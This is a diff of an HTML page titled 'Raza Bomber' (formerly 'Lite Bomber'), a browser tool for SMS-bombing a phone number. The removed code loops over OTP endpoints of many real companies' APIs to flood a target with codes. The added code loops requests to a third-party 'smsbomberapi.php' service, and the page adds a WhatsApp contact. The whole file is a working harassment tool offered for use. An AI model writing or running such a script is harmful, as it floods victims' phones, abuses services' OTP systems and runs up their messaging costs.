@@ -1,111 +1,99 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Lite Bomber</title>
+  <title>Raza Bomber</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      background-color: #1f1f24;
+      background: #0f0f0f;
       color: white;
-      text-align: center;
-      padding: 20px;
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 30px;
     }
     .container {
-      background: #2c2f33;
-      border-radius: 16px;
+      background: #1a1a1a;
       padding: 20px;
+      border-radius: 15px;
+      box-shadow: 0 0 10px #00ffcc;
       max-width: 400px;
-      margin: auto;
+      width: 100%;
+    }
+    h1 {
+      text-align: center;
+      color: #00ffcc;
     }
     input, button {
+      width: 100%;
       padding: 10px;
-      margin: 10px;
-      border-radius: 8px;
+      margin-top: 15px;
       border: none;
+      border-radius: 10px;
+      font-size: 16px;
     }
     input {
-      width: 80%;
+      background: #333;
+      color: white;
     }
     button {
-      background-color: crimson;
-      color: white;
+      background: #00ffcc;
+      color: black;
       cursor: pointer;
+      font-weight: bold;
     }
-    .hint {
-      font-size: 0.9em;
-      color: #bbb;
+    .footer {
+      text-align: center;
+      margin-top: 30px;
+    }
+    .footer a {
+      color: #00ffcc;
+      text-decoration: none;
+      font-weight: bold;
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>Lite Bomber 💣</h1>
-    <input type="text" id="number" placeholder="Enter Mobile e.g. 03001234567" />
-    <input type="number" id="count" placeholder="Enter Bombing Amount (e.g. 50)" />
-    <button onclick="startBombing()">Start Bombing</button>
-    <p class="hint">Number format will auto convert to 92XXXXXXXXXX</p>
-  </div>  <script>
-    function convertTo92Format(num) {
-      if (num.startsWith("03") && num.length === 11) {
-        return "92" + num.slice(1);
-      } else if (num.startsWith("92") && num.length === 12) {
-        return num;
-      } else {
-        return null;
-      }
-    }
+    <h1>Raza<br>Bomber</h1>
+    <input type="text" id="number" placeholder="Enter Number (e.g. 03001234567)" />
+    <input type="number" id="count" placeholder="How many times?" />
+    <button onclick="startBombing()">💣 Bomb</button>
+  </div>
 
-    async function callAPI(url, method = 'GET', body = null) {
-      try {
-        const options = { method };
-        if (body) {
-          options.headers = { 'Content-Type': 'application/json' };
-          options.body = JSON.stringify(body);
-        }
-        await fetch(url, options);
-      } catch (e) {
-        console.log("API error:", url);
-      }
-    }
+  <div class="footer">
+    <p>Contact us: 
+      <a href="https://wa.me/447354208303?text=Hello%20%F0%9F%A4%97" target="_blank">
+        +44 7354 208303 (WhatsApp)
+      </a>
+    </p>
+  </div>
 
-    async function startBombing() {
-      const rawNumber = document.getElementById('number').value.trim();
-      const count = parseInt(document.getElementById('count').value.trim());
-      const number = convertTo92Format(rawNumber);
-
-      if (!number || isNaN(count) || count < 1) {
-        alert("❌ Invalid input");
+  <script>
+    function startBombing() {
+      const numberInput = document.getElementById('number').value.trim();
+      const count = parseInt(document.getElementById('count').value);
+      
+      if (!numberInput || isNaN(count) || count <= 0) {
+        alert("Please enter a valid number and bombing count.");
         return;
       }
 
-      alert(`💥 Sending ${count} requests to ${number}`);
+      // Convert to 92 format if starts with 03
+      let number = numberInput;
+      if (number.startsWith("03")) {
+        number = "92" + number.slice(1);
+      }
 
       for (let i = 0; i < count; i++) {
-        callAPI(`https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=${number}`);
-        callAPI('https://prod.fitflexapp.com/api/users/signupV1', 'POST', { phone: number });
-        callAPI(`https://backend.ustraa.com/rest/V1/api/sendvoiceotp?receiverPhoneNumber=${number}`);
-        callAPI(`https://www.nearbuy.com/mobile/api/user/otp/resend/${number}`);
-        callAPI(`https://www.bajajfinserv.in/MyAccountLogin/Login/GetOTP${number}`);
-        callAPI(`https://accounts.magicbricks.com/userauth/api/resend-otp${number}`);
-        callAPI(`https://accounts.magicbricks.com/userauth/login${number}`);
-        callAPI(`https://be.mcdelivery.co.in/auth/otp/${number}`);
-        callAPI('https://identity.tllms.com/api/request_otp', 'POST', { phone: "+92" + number });
-        callAPI('https://api.countrydelight.in/api/auth/new_request_otp', 'POST', { new_user: true, mobile_no: number });
-        callAPI('https://api.gromoinsure.com/v1/auth/sendOTP', 'POST', { phone: number });
-        callAPI('https://omni-api.moreretail.in/api/v1/login/', 'POST', { phone_number: number, hash_key: "XfsoCeXADQA" });
-        callAPI('https://prod-backend.trinkerr.com/api/v1/web/traders/generateOtpForLogin', 'POST', { mobile: number, otpOperationType: "SignUp" });
-        callAPI('https://api.khatabook.com/v1/auth/request-otp', 'POST', { country_code: "+92", phone: number, app_signature: "Jc/Zu7qNqQ2" });
-        callAPI('https://goplus.in/v3/auth/user/otp', 'POST', { phoneNumber: number, newDevice: false, policyPerused: true });
-        callAPI('https://api.doubtnut.com/v4/student/login', 'POST', { phone_number: number, is_web: "3" });
-        callAPI('https://unacademy.com/api/v3/user/user_check/?enable-email=true', 'POST', { phone: number, country_code: "IN", otp_type: 1 });
-        callAPI('https://www.my11circle.com/api/fl/auth/v3/getOtp', 'POST', { mobile: number });
-        callAPI('https://www.rummycircle.com/api/fl/auth/v3/getOtp', 'POST', { mobile: number });
-        callAPI('https://api.eat-z.com/auth/customer/signin', 'POST', { username: number });
-        callAPI('https://admin.doctime.com.bd/api/otp/send', 'POST', { contact: number });
-        callAPI('https://assetliteapi.banglalink.net/api/v1/user/otp-login/request', 'POST', { mobile: number });
-        callAPI('https://fundesh.com.bd/api/auth/generateOTP?service_key=', 'POST', { msisdn: number });
+        fetch(`https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=${number}`)
+          .catch(() => {}); // Ignore errors
       }
+
+      alert("Bombing started successfully.");
     }
-  </script></body>
+  </script>
+</body>
 </html>
